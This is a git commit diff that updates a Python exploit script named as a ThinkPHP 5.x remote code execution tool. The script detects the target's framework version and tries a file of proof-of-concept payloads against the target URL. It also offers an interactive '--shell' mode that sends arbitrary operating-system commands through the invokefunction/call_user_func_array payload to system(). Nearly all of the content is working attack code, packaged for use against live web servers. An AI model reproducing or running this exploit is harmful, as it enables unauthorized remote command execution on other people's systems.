613fe628f7eb9b413c4833965cfa1e0d134a7ac9
ZYA <zyazhb@yahoo.com>
2019-01-16 17:42:58 +0800

    Update tp5x.py

--- exp/tp5x.py
+++ exp/tp5x.py
@@ -1,44 +1,56 @@
 import requests
 import re
 import optparse
+import time
 
-def test_url(url):
+def test_url(url,v):
     num = 0
     f = open("thinkphp_poc.txt")
     #url = input('Your taget name:(e.g.http://magic-mirro.com/thinkphp/public/index.php):')
     #url = "http://magic-mirro.com/thinkphp/public/index.php"
+    r=requests.get(url + "?s=version_test")
+    version = re.findall('V[0-9].[0-9].[0-9]{1,2}',r.text)
+    if (version):
+        print("Version detected："+ str(version))
+    else:
+        print('Version seems can not be detected!')
+        exit()
+    time.sleep(1)
     for exp in f:
-        print ("[o]Trying poc: " + url + exp)
+        if(v):
+            print ("[o]Trying poc: " + url + exp)
         try:
             r=requests.get(url + exp)
         except:
             continue
-        exist = re.findall('HttpException',r.text)
+        exist = re.findall('HttpException ',r.text) or re.findall('System Error',r.text)
         #print(exist)
         #exist = re.findall('<br/>\\n(.*?)</p>',content)
         if (exist):
-            print('[-]Failed\n')
+            if(v):
+                print('[-]Failed\n')
             continue
         else:
-            print("[+]Seem Exist!\n")
+            print("[+]Found:"+ url + exp + "\n[+]Seem Exist!\n")
             num=num+1
             print("[+]Response:\n"+r.text + '\n'+ '-'*200)
     print("[+++]Test Done!" + str(num) + " poc(s) seem can be use")
 def getshell(url):
     #url = input('Your taget name:(e.g.http://magic-mirro.com/thinkphp/public/index.php):')
     while (True):
-        cmd = raw_input('\nShell by-zya$')
+        cmd = input('\nShell by-zya$')
         exp = "?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php -r\'system(\""+ cmd +"\");'"
         r=requests.get(url + exp)
         print(r.text)
 def main():
     parser = optparse.OptionParser("ThinkPHP 5.x RCE exp by ZYA\n useage %prog "+"-u <url>")
     parser.add_option('-u', dest='u', type='string', help='Target URL')
+    parser.add_option('-v', dest='v', action='store_true', help='Show trying url detail')
     parser.add_option('--shell', dest='shell', action='store_true', help='Prompt for an interactive operating system shell')
     #parser.add_option('--s2', dest='s2', type='string', help='specify string2')
     (options, args) = parser.parse_args()
     if options.shell == None and options.u != None:
-        test_url(options.u);
+        test_url(options.u,options.v);
         exit(0)
     elif options.shell != None and options.u != None:
         getshell(options.u)
